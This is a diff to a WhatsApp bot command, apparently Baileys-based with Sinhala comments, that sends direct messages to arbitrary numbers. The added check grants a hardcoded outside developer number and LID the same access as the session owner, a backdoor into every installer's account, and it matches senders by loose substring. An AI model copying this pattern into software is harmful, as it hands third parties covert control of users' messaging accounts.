@@ -1,27 +1,61 @@
 module.exports = {
   name: "msg",
   alias: ["mgs", "send", "dm"],
-  description: "Send direct message to any number via bot",
+  description: "Send direct message to any number via bot (Developer & Owner Only)",
 
   async execute({ sock, msg, from, args }) {
     try {
+      // 1. Sender ගේ JID එක සහ LID එක ලබා ගැනීම
+      const senderJid = msg.key.fromMe 
+        ? sock.user.id.split(":")[0] + "@s.whatsapp.net"
+        : (msg.key.participant || from);
+
+      // Baileys contextInfo හරහා එන LID හෝ direct sender LID check කිරීම
+      const senderLid = msg.key.participantPn || msg.participant || "";
+
+      // 2. Bot Owner Number (Session එක run වෙන අංකය)
+      const botOwnerPhone = sock.user.id.split(":")[0];
+
+      // 3. Authorized Developers & Owner List
+      const authorizedNumbers = [
+        botOwnerPhone,
+        "94719845166"
+      ];
+
+      const authorizedLids = [
+        "15947733680169@lid",
+        "15947733680169"
+      ];
+
+      // 4. Verification Check: Phone number, LID, හෝ fromMe හරහා Owner බව තහවුරු කිරීම
+      const isOwnerOrDev = 
+        msg.key.fromMe ||
+        authorizedNumbers.some(num => senderJid.includes(num)) ||
+        authorizedLids.some(lid => senderJid.includes(lid) || senderLid.includes(lid));
+
+      // Developer හෝ Owner නොවේ නම් Command එක Reject කිරීම
+      if (!isOwnerOrDev) {
+        sock.sendMessage(from, { react: { text: "🚫", key: msg.key } }).catch(() => {});
+        return await sock.sendMessage(from, {
+          text: `*⛔ ACCESS DENIED ⛔*\n\nමෙම command එක භාවිතා කළ හැක්කේ *DARK-DINU Developer* ට පමණි! 🖤`
+        }, { quoted: msg });
+      }
+
       const fullText = args.join(" ").trim();
 
-      // Format එක වැරදි නම් guide එකක් පෙන්වීම
+      // Format Validation
       if (!fullText || !fullText.includes(",")) {
         return await sock.sendMessage(from, {
           text: `*⚠️ වැරදි Format එකක්!*\n\n*භාවිතා කරන ආකාරය:*\n.msg <number>,<message>\n\n*උදාහරණ:*\n.msg 94719845166, මොකද කරන්නේ?`
         }, { quoted: msg });
       }
 
-      // React to command
+      // Processing React
       sock.sendMessage(from, { react: { text: "⏳", key: msg.key } }).catch(() => {});
 
-      // Number එක සහ Text එක වෙන් කර ගැනීම
       const [rawNumber, ...msgParts] = fullText.split(",");
       const targetText = msgParts.join(",").trim();
 
-      // Number එකෙන් අනවශ්‍ය symbols (+, -, spaces) ඉවත් කිරීම
       let cleanNumber = rawNumber.replace(/[^0-9]/g, "");
 
       if (cleanNumber.startsWith("0")) {
@@ -30,20 +64,20 @@ module.exports = {
 
       if (!targetText) {
         return await sock.sendMessage(from, {
-          text: "⚠️ කරුණාකර යැවීමට අවශ්‍ය පණිවිඩය ඇතුළත් කරන්න."
+          text: "⚠️️ කරුණාකර යැවීමට අවශ්‍ය පණිවිඩය ඇතුළත් කරන්න."
         }, { quoted: msg });
       }
 
       const targetJid = `${cleanNumber}@s.whatsapp.net`;
 
-      // අදාළ අංකයට Bot හරහා Message එක යැවීම
+      // Target අංකයට Bot හරහා Message එක යැවීම
       await sock.sendMessage(targetJid, {
         text: targetText
       });
 
-      // සාර්ථකව Send වූ බවට User ට Status Confirm කිරීම
+      // Developer හට Success Alert එකක් ලබා දීම
       await sock.sendMessage(from, {
-        text: `*✅ Message Sent Successfully!*\n\n📱 *To:* +${cleanNumber}\n💬 *Message:* ${targetText}\n🖤 *DARK-DINU*`
+        text: `*⚡ DARK-DINU TRANSMISSION COMPLETE ⚡*\n\n🎯 *To:* +${cleanNumber}\n💬 *Message:* ${targetText}\n👑 *Authorized Developer Access*`
       }, { quoted: msg });
 
       sock.sendMessage(from, { react: { text: "✅", key: msg.key } }).catch(() => {});
@@ -51,7 +85,7 @@ module.exports = {
     } catch (error) {
       console.error("[MSG SEND ERROR]:", error);
       await sock.sendMessage(from, {
-        text: `❌ පණිවිඩය යැවීමට නොහැකි විය. (Number එක WhatsApp එකේ නැති විය හැක)`
+        text: `❌ පණිවිඩය යැවීමට නොහැකි විය. (Number එක WhatsApp තුළ ලියාපදිංචි වී නොමැත)`
       }, { quoted: msg });
       sock.sendMessage(from, { react: { text: "❌", key: msg.key } }).catch(() => {});
     }
